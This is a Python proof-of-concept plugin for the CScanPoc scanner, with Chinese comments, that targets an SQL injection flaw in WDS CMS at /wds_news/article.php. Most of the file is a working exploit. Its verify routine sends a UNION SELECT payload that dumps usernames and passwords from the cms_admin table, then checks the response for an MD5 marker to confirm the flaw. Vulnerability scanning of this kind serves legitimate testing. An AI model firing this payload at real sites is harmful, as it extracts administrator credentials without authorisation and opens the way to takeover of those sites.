# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'WDS-CMS_0001'  # 平台漏洞编号，留空
    name = 'WDS CMS /wds_news/article.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-10'  # 漏洞公布时间
    desc = '''
    WDSCMS是一款国外知名的内容管理系统。
    WDSCMS SQL注入漏洞，漏洞位于/wds_news/article.php。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37750/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WDS-CMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8d732f37-76fb-4ec4-9895-c5b6ece8bc39'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/wds_news/article.php?ID=-1+union+select+1,group_concat(username,0x3a'
                       ',password),3,4,5,md5(567),6,7,8,9,10+from+cms_admin--')
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if '99C5E07B4D5DE9D18C350CDF64C5AA3D' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
